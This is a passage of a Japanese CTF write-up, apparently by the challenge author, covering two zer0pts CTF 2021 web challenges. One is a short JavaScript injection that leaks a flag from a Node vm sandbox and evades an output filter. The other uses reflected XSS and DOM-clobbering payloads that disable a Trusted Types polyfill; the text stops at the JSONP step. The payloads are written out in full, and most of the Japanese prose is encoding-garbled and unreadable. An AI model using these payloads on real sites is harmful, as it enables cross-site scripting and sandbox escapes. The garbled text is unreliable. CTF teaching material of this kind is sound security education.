---
layout: post
title: zer0pts CTF 2021 ã§å‡ºé¡Œã—ãŸå•é¡Œã®è§£èª¬
categories: [ctf, zer0pts]
date: 2021-03-07 21:00:00 +0900
---

(English version: [Kantan Calc](https://hackmd.io/@st98/Sy7D5NymO), [Simple Blog](https://hackmd.io/@st98/S1z9qV1X_))

3 æœˆ 6 æ—¥ã‹ã‚‰ 3 æœˆ 7 æ—¥ã«ã‹ã‘ã¦ã€ãƒãƒ¼ãƒ  zer0pts ã¯ [zer0pts CTF 2021](https://ctftime.org/event/1256) ã‚’é–‹å‚¬ã—ã¾ã—ãŸã€‚ç™»éŒ²ãƒãƒ¼ãƒ æ•°ã¯ 1447 ãƒãƒ¼ãƒ ã€50 ç‚¹ä»¥ä¸Šå¾—ç‚¹ã—ãŸãƒãƒ¼ãƒ ã¯ 951 ãƒãƒ¼ãƒ ã¨å¤§å¤‰å¤šãã®æ–¹ã«ã”å‚åŠ ã„ãŸã ãã¾ã—ãŸã€‚ã‚ã‚ŠãŒã¨ã†ã”ã–ã„ã¾ã—ãŸã€‚

1 ä½ã¯ 5211 ç‚¹ã‚’ç²å¾—ã—ãŸ Super Guesserã€2 ä½ã¯ 5153 ç‚¹ã‚’ç²å¾—ã—ãŸ K-Studentsã€3 ä½ã¯ 5153 ç‚¹ã‚’ç²å¾—ã—ãŸ r00timentary ã§ã—ãŸã€‚ãŠã‚ã§ã¨ã†ã”ã–ã„ã¾ã™ğŸ‰

ã“ã®è¨˜äº‹ã§ã¯ã€å‡ºé¡Œã•ã‚ŒãŸ 30 å•ã®ã†ã¡ç§ãŒä½œå•ã—ãŸä»¥ä¸‹ã® 2 å•ã«ã¤ã„ã¦è§£èª¬ã—ã¾ã™ã€‚

- [[Web 135] Kantan Calc (50 solves)](#web-135-kantan-calc-50-solves)
- [[Web 192] Simple Blog (23 solves)](#web-192-simple-blog-23-solves)

## [Web 135] Kantan Calc (50 solves)
> "Kantan" means simple or easy in Japanese.
> 
> (URL)
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«: [kantan_calc_534d6763ad47ad2dadb6f6eef0e47404.tar.gz](../files/kantan_calc_534d6763ad47ad2dadb6f6eef0e47404.tar.gz)

ä»¥ä¸‹ã®ã‚ˆã†ãªã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ãŒä¸ãˆã‚‰ã‚Œã¦ã„ã¾ã™ã€‚`'use strict'; (function () { return ${code}; /* ${FLAG} */ })()` ã¨ã„ã†ã‚³ãƒ¼ãƒ‰ã«ãƒ¦ãƒ¼ã‚¶å…¥åŠ›ãŒå±•é–‹ã•ã‚Œã€`vm.runInNewContext` ã«ã‚ˆã£ã¦ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹å†…ã§å®Ÿè¡Œã•ã‚Œã‚‹ã¨ã„ã† Web ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã™ã€‚

ãƒ•ãƒ©ã‚°ã¯ã‚³ãƒ¼ãƒ‰ãŒæŒ¿å…¥ã•ã‚Œã‚‹é–¢æ•°å†…ã®ã‚³ãƒ¡ãƒ³ãƒˆã«å«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ã¨ã„ã†ã“ã¨ã§ã€ãªã‚“ã¨ã‹ã—ã¦ãƒ•ãƒ©ã‚°ãŒã‚³ãƒ¡ãƒ³ãƒˆã¨ã—ã¦å«ã¾ã‚Œã¦ã„ã‚‹é–¢æ•°ã‚’æ–‡å­—åˆ—åŒ–ã—ã¦å–ã‚Šå‡ºã™ã®ãŒç›®æ¨™ã«ãªã‚Šã¾ã™ã€‚æŒ¿å…¥ã§ãã‚‹ã‚³ãƒ¼ãƒ‰ã¯ 29 æ–‡å­—ä»¥å†…ã¨çŸ­ã„ã®ã§ã€JavaScript ã®æ–‡æ³•ã‚’ä½¿ã„ãªãŒã‚‰ã‚³ãƒ¼ãƒ‰ã‚’ç¸®ã‚ã¦ã„ãã¾ã—ã‚‡ã†ã€‚

```javascript
const express = require('express');
const path = require('path');
const vm = require('vm');
const FLAG = require('./flag');

const app = express();

app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', function (req, res, next) {
  let output = '';
  const code = req.query.code + '';

  if (code && code.length < 30) {
    try {
      const result = vm.runInNewContext(`'use strict'; (function () { return ${code}; /* ${FLAG} */ })()`, Object.create(null), { timeout: 100 });
      output = result + '';
      if (output.includes('zer0pts')) {
        output = 'Error: please do not exfiltrate the flag';
      }
    } catch (e) {
      output = 'Error: error occurred';
    }
  } else {
    output = 'Error: invalid code';
  }

  res.render('index', { title: 'Kantan Calc', output });
});

app.get('/source', function (req, res) {
  res.sendFile(path.join(__dirname, 'app.js'));
});

module.exports = app;
```

### é–¢æ•°ã‚’åˆ†ã‘ã‚‹
ã¾ãšã€ã©ã†ã‚„ã£ã¦ãƒ•ãƒ©ã‚°ãŒå«ã¾ã‚Œã¦ã„ã‚‹é–¢æ•°ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚Œã°ã‚ˆã„ã§ã—ã‚‡ã†ã‹ã€‚æ™®é€šãªã‚‰é–¢æ•°å†…ã§ã¯ `arguments.callee` ã§é–¢æ•°è‡ªèº«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€æ®‹å¿µãªãŒã‚‰ã“ã®å•é¡Œã§ã¯ `'use strict'` ã«ã‚ˆã£ã¦ strict ãƒ¢ãƒ¼ãƒ‰ãŒæœ‰åŠ¹åŒ–ã•ã‚Œã¦ãŠã‚Šã€åˆ©ç”¨ã§ãã¾ã›ã‚“ã€‚

ã§ã¯ã©ã†ã™ã‚‹ã‹ã¨ã„ã†ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ã«é–¢æ•°ã‚’åˆ†ã‘ã¾ã™ã€‚ãƒ•ãƒ©ã‚°ãŒå«ã¾ã‚Œã¦ã„ã‚‹é–¢æ•°ãŒå‰ã«ä½ç½®ã™ã‚‹é–¢æ•°ã®å¼•æ•°ã¨ã—ã¦æ¸¡ã•ã‚Œã€`arguments[0]` ã§ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```javascript
'use strict'; (function () { return arguments[0] })(function () {; /* ${FLAG} */ })()
                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                           (inserted code)
```

### ã‚³ãƒ¼ãƒ‰ã‚´ãƒ«ãƒ•
JavaScript ã®æ©Ÿèƒ½ã‚’ä½¿ã£ã¦ã“ã®ã‚³ãƒ¼ãƒ‰ã‚’ã¡ã‚‡ã£ã¨ãšã¤ç¸®ã‚ã¦ã„ãã¾ã—ã‚‡ã†ã€‚

1: ã‚¢ãƒ­ãƒ¼é–¢æ•°ã‚’ä½¿ã†ã¨ã€`function () {}` ã¨ã„ã†è¨˜æ³•ã‚’ä½¿ã†ã‚ˆã‚Šã‚‚çŸ­ããªã‚Šã¾ã™ã€‚

```javascript
'use strict'; (function () { return () => arguments[0]})(() => {; /* ${FLAG} */ })()
                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                          (inserted code)
```

2: ã‚¢ãƒ­ãƒ¼é–¢æ•°ã¯å¼•æ•°ã‚’æŒãŸãªã„å ´åˆã«ã¯ `() => {}` ã¨ã„ã†ã‚ˆã†ã« `()` ã‚’è¨˜è¿°ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãŸã ã€JavaScript ã§ã¯ä»®å¼•æ•°ã¨å®Ÿå¼•æ•°ã®æ•°ãŒé•ã£ã¦ã„ã¦ã‚‚ã€ãã‚Œã ã‘ã§ã¯ã‚¨ãƒ©ãƒ¼ã«ã¯ãªã‚Šã¾ã›ã‚“ã‹ã‚‰ã€é©å½“ãªå¼•æ•°ã‚’æŒãŸã›ã¦ã‚„ã‚‹ã¨å°‘ã—çŸ­ãã§ãã¾ã™ã€‚

```javascript
'use strict'; (function () { return a => arguments[0]})(b => {; /* ${FLAG} */ })()
                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^
                                          (inserted code)
```

3: ã‚¹ãƒšãƒ¼ã‚¹ã‚’å–ã‚Šé™¤ãã¾ã—ã‚‡ã†ã€‚

```javascript
'use strict'; (function () { return a=>arguments[0]})(b=>{; /* ${FLAG} */ })()
                                    ^^^^^^^^^^^^^^^^^^^^^^
                                        (inserted code)
```

ã§ãã‚ãŒã£ãŸã‚³ãƒ¼ãƒ‰ã® `a=>arguments[0]})(b=>{` ã‚’æŠ•ã’ã¦ã‚„ã‚‹ã¨â€¦ `please do not exfiltrate the flag` ã¨æ€’ã‚‰ã‚Œã¦ã—ã¾ã„ã¾ã—ãŸã€‚

![do not exfiltrate the flag!!!](../images/2021-03-07_kantan1.png)

ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’èª­ã‚€ã¨ãã®ç†ç”±ãŒã‚ã‹ã‚Šã¾ã™ã€‚å…ˆã»ã©ã®ã‚³ãƒ¼ãƒ‰ã§ãƒ•ãƒ©ã‚°ãŒå«ã¾ã‚Œã‚‹é–¢æ•°ã‚’ `vm.runInNewContext` ã®è¿”ã‚Šå€¤ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã—ãŸã€‚ã—ã‹ã—ãªãŒã‚‰ã€æ–‡å­—åˆ—åŒ–ã•ã‚ŒãŸã“ã®é–¢æ•°ã«ã¯ `zer0pts` ãŒå«ã¾ã‚Œã‚‹ã®ã§ã€ä»¥ä¸‹ã®å‡¦ç†ã§å¼¾ã‹ã‚Œã¦ã—ã¾ã„ã¾ã™ã€‚ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹æ–¹æ³•ã‚’è€ƒãˆã¦ã„ãã¾ã—ã‚‡ã†ã€‚

```javascript
      if (output.includes('zer0pts')) {
        output = 'Error: please do not exfiltrate the flag';
      }
```

### è¿”ã‚Šå€¤ã®ãƒã‚§ãƒƒã‚¯ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹
è¿”ã‚Šå€¤ã®ãƒã‚§ãƒƒã‚¯ã‚’ã”ã¾ã‹ã™æ–¹æ³•ã¯ã„ãã¤ã‹è€ƒãˆã‚‰ã‚Œã¾ã™ã€‚ä¾‹ãˆã° `String.prototype.replace` ã‚„ã‚‰ `String.prototype.slice` ã¨ã„ã£ãŸé–¢æ•°ã§æ–‡å­—åˆ—ãŒ `zer0pts` ã‚’å«ã¾ãªã„ã‚ˆã†ã«ã™ã‚‹ (29 æ–‡å­—ã«åã¾ã‚‹ã‹ã¯çŸ¥ã‚Šã¾ã›ã‚“ãŒâ€¦)ã€æ–‡å­—åˆ—åŒ–ã—ãŸé–¢æ•°ã‚’ `str[i]` ã¨ã„ã£ãŸæ„Ÿã˜ã§ãƒ–ãƒ©ã‚±ãƒƒãƒˆã‚’ä½¿ã£ã¦ 1 æ–‡å­—ãšã¤æŠ½å‡ºã™ã‚‹ã¨ã„ã£ãŸæ–¹æ³•ãŒã‚ã‚Šã¾ã™ãŒã€ä»Šå›ã¯æ–‡å­—åˆ—ã‚’é…åˆ—ã«å¤‰æ›ã™ã‚‹æ–¹æ³•ã‚’ä½¿ã„ã¾ã—ã‚‡ã†ã€‚

[ã‚¹ãƒ—ãƒ¬ãƒƒãƒ‰æ§‹æ–‡](https://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Operators/Spread_syntax)ã‚’ä½¿ã†ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ã«æ–‡å­—åˆ—ã‚’ 1 æ–‡å­—ãšã¤åˆ†å‰²ã•ã‚ŒãŸé…åˆ—ã«å¤‰æ›ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```javascript
[...'abc'] // => ["a", "b", "c"]
```

é…åˆ—ã‚’æ–‡å­—åˆ—ã«å¤‰æ›ã™ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ã«è¦ç´ ãŒã‚³ãƒ³ãƒåŒºåˆ‡ã‚Šã§çµåˆã•ã‚Œã¾ã™ã€‚

```javascript
["a", "b", "c"] + '' // => "a,b,c"
```

ã“ã‚Œã‚‰ã®æŒ™å‹•ã‚’åˆ©ç”¨ã—ã¦ã€ä»¥ä¸‹ã®ã‚ˆã†ãªã‚³ãƒ¼ãƒ‰ã§ãƒ•ãƒ©ã‚°ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã¯ãšã§ã™ã€‚

```javascript
'use strict'; (function () { return a=>[...arguments[0]+0]})(b=>{; /* ${FLAG} */ })()
                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                           (inserted code)
```

ã‚„ã£ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

![ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚ŒãŸ](../images/2021-03-07_kantan2.png)

ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
zer0pts{K4nt4n_m34ns_4dm1r4t1on_1n_J4p4n3s3}
```

---

ã“ã‚Œã ã‘ã®ãƒãƒ¼ãƒ ã«è§£ã‹ã‚Œã‚‹ã¨ã¯æ€ã£ã¦ã„ã¾ã›ã‚“ã§ã—ãŸã€‚Harekaze CTF 2019 ã® [[Misc 200] [a-z().]](2019-05-21-harekaze-ctf-2019.html#misc-200-a-z)ã€Harekaze mini CTF 2020 ã® [[Misc 322] Proxy Sandbox](2020-12-29-harekaze-mini-ctf-2020.html#misc-322-proxy-sandbox-7-solves) ã«å¼•ãç¶šã„ã¦ã€JavaScript ã§éŠã¶å•é¡Œã§ã—ãŸã€‚ã“ã†ã„ã†å•é¡Œã¯ãŸã¶ã‚“ã‚‚ã†å‡ºã•ãªã„ã¨æ€ã„ã¾ã™ã€‚ãŸã¶ã‚“ã€‚

å•é¡Œã®ãƒªãƒªãƒ¼ã‚¹ç›´å¾Œã¯ `vm.runInNewContext` ã®ç¬¬äºŒå¼•æ•°ã¨ã—ã¦ä¸ãˆã¦ã„ã‚‹ `Object.create(null)` ã‚’ `{}` ã¨ã—ã¦ãŠã‚Šã€Prototype Pollution ã‚’èµ·ã“ã—ã¦ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹å¤–ã«å½±éŸ¿ã‚’ä¸ãˆã‚‰ã‚Œã‚‹ã‚ˆã†ã«ãªã£ã¦ã„ã¾ã—ãŸã€‚`__proto__.a = 'abc'` ã¨ã„ã†ã‚ˆã†ãªå…¥åŠ›ã‚’ä¸ãˆã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ã« (ãªãœã‹) ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã®ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°æ™‚ã«ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã™ã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚ã“ã‚ŒãŒåŸå› ã§ã—ã°ã‚‰ãå•é¡ŒãŒåˆ©ç”¨ã§ããªã„çŠ¶æ…‹ã«ãªã£ã¦ã„ã¾ã—ãŸã€‚ã™ã¿ã¾ã›ã‚“ã€‚

```
Error: /app/views/index.pug:8:32
    6|   a(href='/source') source
    7|   h2 Code
  > 8|   form(action='/', method='get')
--------------------------------------^
    9|     input(type='text', name='code', size=40, placeholder='7*7', maxlength=29)
    10|     input(type='submit', value='submit')
    11|   h2 Output

Mismatched Bracket: )
```

## [Web 192] Simple Blog (23 solves)
> Now I am developing a blog service. I'm aware that there is a simple XSS. However, I introduced strong security mechanisms, named Content Security Policy and Trusted Types. So you cannot abuse the vulnerability in any modern browsers, including Firefox, right?
> 
> (URL)
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«: [simple_blog_1802a68a066b0286632ecb1713377283.tar.gz](../files/simple_blog_1802a68a066b0286632ecb1713377283.tar.gz)

ãƒ–ãƒ­ã‚°ã‚µãƒ¼ãƒ“ã‚¹ã§ã™ã€‚è‡ªæ˜ãª XSS ãŒã‚ã‚‹ã‘ã©ã€Content Security Policy (CSP) ã¨ Trusted Types ã¨ã„ã†ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æ©Ÿæ§‹ã‚’å°å…¥ã—ã¦ã„ã‚‹ã‹ã‚‰ã€Firefox ã‚’å«ã‚€ãƒ¢ãƒ€ãƒ³ãªãƒ–ãƒ©ã‚¦ã‚¶ã§ã¯è„†å¼±æ€§ã‚’æ‚ªç”¨ã§ããªã„ã ã‚ã†ã¨ä¸»å¼µã—ã¦ã„ã¾ã™ã€‚æœ¬å½“ã«ãã†ã§ã—ã‚‡ã†ã‹ã€‚

### ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’èª­ã‚€
æ·»ä»˜ã•ã‚Œã¦ã„ã‚‹ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’è¦‹ã¦ã„ãã¾ã—ã‚‡ã†ã€‚ã“ã® Web ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ `index.php` ã¨ `api.php` ã«ä¸»ãªå‡¦ç†ãŒã‚ã‚Šã¾ã™ã€‚`api.php` ã¯ `index.php` ã‹ã‚‰å‘¼ã³å‡ºã•ã‚Œã‚‹ JSONP ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã§ã€ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯é–¢æ•°ã®åå‰ã¯ 20 æ–‡å­—ä»¥ä¸‹ã«åˆ¶é™ã•ã‚Œã¦ã„ã¾ã™ã€‚

```php
<?php
header('Content-Type: application/javascript');
$callback = $_GET['callback'] ?? 'render';
if (strlen($callback) > 20) {
  die('throw new Error("callback name is too long")');
}
echo $callback . '(' . json_encode([
  ["id" => 1, "title" => "Hello, world!", "content" => "Welcome to my blog platform!"],
  ["id" => 2, "title" => "Lorem ipsum", "content" => "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."]
]) . ')';
```

å•é¡Œæ–‡ã«æ›¸ã‹ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€`theme` ã¨ã„ã† GET ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ç”±æ¥ã® Reflected XSS ãŒå­˜åœ¨ã—ã¦ã„ã¾ã™ã€‚

```php
<?php
$nonce = base64_encode(random_bytes(20));
$theme = $_GET['theme'] ?? 'dark';
?>
```

```html
    <link rel="stylesheet" href="/css/bootstrap-<?= $theme ?>.min.css">
    <link rel="stylesheet" href="/css/style.css">
  </head>
  <body>
    <div class="container">
      <nav class="navbar navbar-expand-lg navbar-<?= $theme ?> bg-<?= $theme ?>">
```

ä¸€æ–¹ã§ã€å•é¡Œæ–‡ã«æ›¸ã‹ã‚Œã¦ã„ã‚‹ã‚ˆã†ã« CSP ã¨ Trusted Types ã«ã‚ˆã£ã¦ Web ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å …ç‰¢ã«ã—ã‚ˆã†ã¨ã—ã¦ã„ã¾ã™ã€‚CSP ã¯ nonce ã‚’å±æ€§ã«æŒã¤ `script` è¦ç´ ã‹ã‚‰èª­ã¿è¾¼ã¾ã‚Œã‚‹ (`'nonce-<?= $nonce ?>'`) ã‹ã€ã™ã§ã«å®Ÿè¡Œã‚’è¨±å¯ã•ã‚ŒãŸ JavaScript ã‚³ãƒ¼ãƒ‰ã‹ã‚‰èª­ã¿è¾¼ã¾ã‚ŒãŸ (`'strict-dynamic'`)  JavaScript ã‚³ãƒ¼ãƒ‰ã—ã‹å®Ÿè¡Œã§ããªã„ã‚ˆã†ã«ã•ã‚Œã¦ã„ã¾ã™ã€‚

```html
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; object-src 'none'; base-uri 'none'; script-src 'nonce-<?= $nonce ?>' 'strict-dynamic'; require-trusted-types-for 'script'; trusted-types default">
```

`'strict-dynamic'` ãŒä»˜ä¸ã•ã‚Œã¦ã„ã‚‹ã®ã¯ JSONP ã®ãŸã‚ã§ã—ã‚‡ã†ã€‚

```javascript
    // JSONP
    const jsonp = (url, callback) => {
      const s = document.createElement('script');

      if (callback) {
        s.src = `${url}?callback=${callback}`;
      } else {
        s.src = url;
      }

      document.body.appendChild(s);
    };
```

Trusted Types ã‚’ä½¿ã£ã¦ `innerHTML` ãªã©ã®åˆ©ç”¨æ™‚ã« `<` ã‚„ `>` ã‚’å‰Šé™¤ã™ã‚‹ã»ã‹ã€`callback` ã¨ã„ã†æ–‡å­—åˆ—ã‚’å«ã‚€ URL ã‚’ JavaScript ã‚³ãƒ¼ãƒ‰ã¨ã—ã¦èª­ã¿è¾¼ã‚€ã“ã¨ã‚’ç¦æ­¢ã—ã¦ã„ã¾ã™ã€‚å¾Œè€…ã¯ JSONP ã®å®Ÿè¡Œæ™‚ã« `render` ä»¥å¤–ã®ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯é–¢æ•°ã‚’å®Ÿè¡Œã•ã›ã‚‹ã“ã¨ã‚’é˜²ããŸã‚ã§ã—ã‚‡ã†ã€‚

```javascript
      // try to register trusted types
      try {
        trustedTypes.createPolicy('default', {
          createHTML(url) {
            return url.replace(/[<>]/g, '');
          },
          createScriptURL(url) {
            if (url.includes('callback')) {
              throw new Error('custom callback is unimplemented');
            }

            return url;
          }
        });
      } catch {
        if (!trustedTypes.defaultPolicy) {
          throw new Error('failed to register default policy');
        }
      }
```

å•é¡Œæ–‡ã‚„ admin ã¸ã®å ±å‘Šãƒšãƒ¼ã‚¸ (å ±å‘Šã•ã‚ŒãŸ URL ã« bot ãŒã‚¢ã‚¯ã‚»ã‚¹ã—ã«è¡Œã) ã«æ›¸ã‹ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€admin ã¯ Firefox ã‚’ä½¿ã£ã¦ URL ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™ã€‚`index.php` ã§ã¯ Trusted Types ã® [polyfill](https://github.com/w3c/webappsec-trusted-types) ãŒèª­ã¿è¾¼ã¾ã‚Œã¦ã„ã¾ã™ãŒã€ã“ã‚Œã¯ Firefox ãŒ Trusted Types ã‚’ãƒã‚¤ãƒ†ã‚£ãƒ–ã«ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ãªã„ãŸã‚ã§ã—ã‚‡ã†ã€‚

```html
    <script src="/js/trustedtypes.build.js" nonce="<?= $nonce ?>" data-csp="require-trusted-types-for 'script'; trusted-types default"></script>
```

### Trusted Types ã‚’æ½°ã™
ã¾ãšã‚„ã‚‹ã¹ãã“ã¨ã¯ã€JSONP ã§ `callback` ã‚’ä½¿ã†ãŸã‚ã« Trusted Types ã‚’æ½°ã™ã“ã¨ã§ã™ã€‚

ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’èª­ã‚“ã éš›ã«ç¢ºèªã—ãŸã‚ˆã†ã«ã€admin ã®ç’°å¢ƒã§ã¯ Firefox ãŒä½¿ã‚ã‚Œã¦ã„ã¾ã™ã€‚Firefox ã§ã¯ Trusted Types ã¯ãƒã‚¤ãƒ†ã‚£ãƒ–ã«ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã¾ã›ã‚“ã‹ã‚‰ã€èª­ã¿è¾¼ã¾ã‚Œã¦ã„ã‚‹ polyfill ãŒä½¿ã‚ã‚Œã¾ã™ã€‚

polyfill ã®å®Ÿè£…ã‚’è¦‹ã¦ã„ãã¨ã€ã“ã‚Œã¯ [`window.trustedTypes` ãŒ truthy ã§ã‚ã‚‹å ´åˆã« Web ãƒ–ãƒ©ã‚¦ã‚¶ãŒ Trusted Types ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã‚‹ã¨åˆ¤æ–­ã—ã¦ã„ã‚‹](https://github.com/w3c/webappsec-trusted-types/blob/1404e198bcf8e0c06a0ab00b75081b3fafb37bed/src/polyfill/api_only.js#L30-L39)ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

```javascript
  const rootProperty = 'trustedTypes';

  // Convert old window.TrustedTypes to window.trustedTypes.
  if (window['TrustedTypes'] && typeof window[rootProperty] === 'undefined') {
    window[rootProperty] = Object.freeze(window['TrustedTypes']);
  }

  if (typeof window[rootProperty] !== 'undefined') {
    return;
  }
```

ã¤ã¾ã‚Šã€ãªã‚“ã¨ã‹ã—ã¦ `window.trustedTypes` ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ truthy ãªå€¤ãŒè¿”ã£ã¦ãã‚‹ã‚ˆã†ã«ã™ã‚Œã°ã€admin ã®ç’°å¢ƒã«ãŠã„ã¦ã‚‚ Trusted Types ã‚’ç„¡åŠ¹åŒ–ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã¯ãšã§ã™ã€‚ã—ã‹ã—ã€JavaScript ãªã—ã«ã©ã†ã™ã‚Œã°ã‚ˆã„ã§ã—ã‚‡ã†ã‹ã€‚ãã®æ–¹æ³•ã®ã²ã¨ã¤ã«ã€[DOM Clobbering](https://diary.shift-js.info/dom-clobbering/) ãŒã‚ã‚Šã¾ã™ã€‚

DOM Clobbering ã¯ã€HTML ã® `id` è¦ç´ ãªã©ã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ã§æœªåˆæœŸåŒ–ã®ã‚°ãƒ­ãƒ¼ãƒãƒ«å¤‰æ•°ã« HTML ã®è¦ç´ ã‚’å…¥ã‚Œã‚‹ã“ã¨ãŒã§ãã‚‹ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã§ã™ã€‚ã“ã‚Œã‚’ä½¿ã†ã¨ã€ä¾‹ãˆã°ä»¥ä¸‹ã®ã‚ˆã†ãªãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã§ `window.trustedTypes` ã‚’ truthy ãªå€¤ (`HTMLElement` ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ) ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```html
"><s id="trustedTypes">test</s>
```

å•é¡Œã‚µãƒ¼ãƒã§è©¦ã—ã¦ã¿ã‚‹ã¨ã€ç¢ºã‹ã« `window.trustedTypes` ã« `HTMLElement` ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒå…¥ã£ã¦ã„ã‚‹ã“ã¨ãŒç¢ºèªã§ãã¾ã—ãŸã€‚

![ã‚„ã£ãŸã­](../images/2021-03-07_blog1.png)

ã—ã‹ã—ã€ä»¥ä¸‹ã®ã‚ˆã†ãªã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒå‡ºã¦ã—ã¾ã£ã¦ã„ã¾ã™ã€‚

![ã©ã†ã—ã¦](../images/2021-03-07_blog2.png)

`index.php` ã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’è¦‹ã‚‹ã¨ã€`trustedTypes.defaultPolicy` ãŒ truthy ã§ãªã„å ´åˆ (Trusted Types ãŒãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒãƒªã‚·ãƒ¼ã®ä½œæˆã«å¤±æ•—ã—ãŸå ´åˆ) ã«ã“ã®ã‚ˆã†ãªã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã™ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

```javascript
        if (!trustedTypes.defaultPolicy) {
          throw new Error('failed to register default policy');
        }
```

ã“ã®ã‚ˆã†ã«ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒã•ã‚Œã¦ã„ã‚‹å ´åˆã§ã‚‚ã€[DOM Clobbering](https://portswigger.net/research/dom-clobbering-strikes-back) ã§ truthy ãªå€¤ã‚’è¨­å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

Firefox ã§ã¯ã€ä»¥ä¸‹ã®ã‚ˆã†ãªãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã§ `trustedTypes` ã¨ `trustedTypes.defaultPolicy` ã®ã„ãšã‚Œã‚‚ truthy ãªå€¤ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```html
"><form id="trustedTypes"><input id="defaultPolicy"></form>
```

å•é¡Œã‚µãƒ¼ãƒã§è©¦ã—ã¦ã¿ã‚‹ã¨ã€ã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒè¡¨ç¤ºã•ã‚Œãšã€ä»Šåº¦ã“ã Trusted Types ã‚’ç„¡åŠ¹åŒ–ã™ã‚‹ã“ã¨ãŒã§ããŸã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

![ã‚„ã£ãŸã­](../images/2021-03-07_blog3.png)

### JSONP ã‚’æ‚ªç”¨ã™ã‚‹
æ¬¡ã«ã‚„ã‚‹ã¹ãã“ã¨ã¯ã€å•é¡Œãƒšãƒ¼ã‚¸ä¸Šã§ã®ä»»æ„ã‚³ãƒ¼ãƒ‰ã®å®Ÿè¡Œã‚’å¯èƒ½ã«ã™ã‚‹ã“ã¨ã§ã™ã€‚

